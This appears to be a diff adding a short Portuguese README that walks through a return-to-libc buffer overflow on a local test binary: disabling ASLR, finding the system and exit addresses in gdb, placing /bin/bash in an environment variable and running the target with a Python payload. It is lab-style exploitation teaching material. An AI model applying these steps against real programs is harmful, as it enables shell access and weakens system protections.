@@ -1,0 +1,29 @@
+1 - Desabilite o ASLR :
+
+echo 0 > /proc/sys/kernel/randomize_va_space
+
+2 - Pegue o endereco da system e do exit :
+
+neo@matrix:/opt/desenv/PoC/Linux/return_libc$ gdb -q ./teste 
+Reading symbols from ./teste...(no debugging symbols found)...done.
+(gdb) b main
+Breakpoint 1 at 0x8048423
+(gdb) r
+Starting program: /opt/desenv/PoC/Linux/return_libc/teste 
+
+Breakpoint 1, 0x08048423 in main ()
+(gdb) p &system
+$1 = (<text variable, no debug info> *) 0xb7e503e0 <__libc_system>
+(gdb) p &exit
+$2 = (<text variable, no debug info> *) 0xb7e431b0 <__GI_exit>
+(gdb)
+
+posteriormente coloque no exploit
+
+3 - exporte a variavel shell com o conteudo /bin/bash
+
+export SHELL=/bin/bash
+
+4 - pegue o endereco da SHELL com o programa catch e coloque no exploit
+
+5 - execute com ./teste `python.py`
